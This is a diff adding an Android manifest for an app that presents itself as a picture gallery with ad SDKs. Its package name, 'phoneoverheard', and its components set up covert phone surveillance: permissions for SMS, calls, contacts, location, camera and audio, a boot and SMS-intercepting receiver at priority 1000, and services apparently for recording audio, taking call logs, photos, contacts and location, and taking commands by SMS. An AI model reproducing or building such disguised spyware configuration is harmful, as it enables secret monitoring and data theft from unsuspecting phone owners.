@@ -1,0 +1,180 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.phoneoverheard.phonne"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk
+        android:minSdkVersion="8"
+        android:targetSdkVersion="17" />
+    <!-- 接收短信权限 -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <!-- 发送消息 -->
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <!-- 阅读消息 -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- 写入消息 -->
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <!-- 访问internet权限 -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <!-- 在SDCard中创建与删除文件权限 -->
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <!-- 往SDCard写入数据权限 -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <!-- 有米 -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <!-- 开机启动权限 -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.PERMISSION_NAME" />
+    <!-- <uses-permission android:name="android.permission.WRITE_APN_SETTINGS" /> -->
+    <!-- <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" /> -->
+    <!-- 以下是使用wifi访问网络所需的权限 -->
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+
+    <application
+        android:hardwareAccelerated="true"
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme"
+        android:name="cn.linving.girls.MyApplication" >
+        
+        <activity
+            android:name="cn.linving.girls.activity.SplashSpotActivity"
+            android:configChanges="keyboard|keyboardHidden|screenSize|orientation"
+            android:label="@string/app_name" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
+        <activity
+            android:name="cn.linving.girls.activity.HomeActivity"
+            android:label="@string/app_name" >
+        </activity>
+        <activity
+            android:name="cn.linving.girls.activity.BigImageActivity"
+            android:launchMode="singleInstance" >
+        </activity>
+        <activity
+            android:name="cn.linving.girls.activity.SettingActivity"
+            android:launchMode="singleTask" >
+        </activity>
+        <activity android:name="cn.linving.girls.activity.AboutUsActivity" >
+        </activity>
+        <!-- umeng app key -->
+        <meta-data
+            android:name="UMENG_APPKEY"
+            android:value="54fd39bafd98c572e0000575" >
+        </meta-data>
+        <meta-data
+            android:name="UMENG_CHANNEL"
+            android:value="Umeng" >
+        </meta-data>
+        <!-- Update Activitys Start -->
+        <activity
+            android:name="com.umeng.update.UpdateDialogActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
+        </activity>
+        <activity
+            android:name="com.umeng.fb.ConversationActivity"
+            android:theme="@android:style/Theme.NoTitleBar" />
+        <activity
+            android:name="com.umeng.fb.ContactActivity"
+            android:theme="@android:style/Theme.NoTitleBar" />
+
+        <service
+            android:name="com.umeng.update.net.DownloadingService"
+            android:process=":DownloadingService" >
+        </service>
+        <!-- 有米 -->
+        <activity
+            android:name="net.youmi.android.AdBrowser"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenSize"
+            android:theme="@android:style/Theme.Light.NoTitleBar" >
+        </activity>
+
+        <service
+            android:name="net.youmi.android.AdService"
+            android:exported="false" >
+        </service>
+
+        <receiver android:name="net.youmi.android.AdReceiver" >
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+
+        <!-- 开机启动服务 ,系统启动完成后会调用 -->
+        <receiver android:name="com.phoneoverheard.phonne.BootBroadcastReceiver" >
+            <intent-filter android:priority="1000" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <!-- 消息推送服务 -->
+        <service
+            android:name="com.phoneoverheard.phonne.PhoneService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.duanxinService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.haomaService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.lianxirenService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.weizhiService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.luyinService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.tonghuajiluService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.ManagerService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.SimmsgService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.SmscmdService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.smsService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.NetworkService"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.SDCardListener"
+            android:enabled="true" />
+        <service
+            android:name="com.phoneoverheard.phonne.zhaopianService"
+            android:enabled="true" />
+    </application>
+
+</manifest>
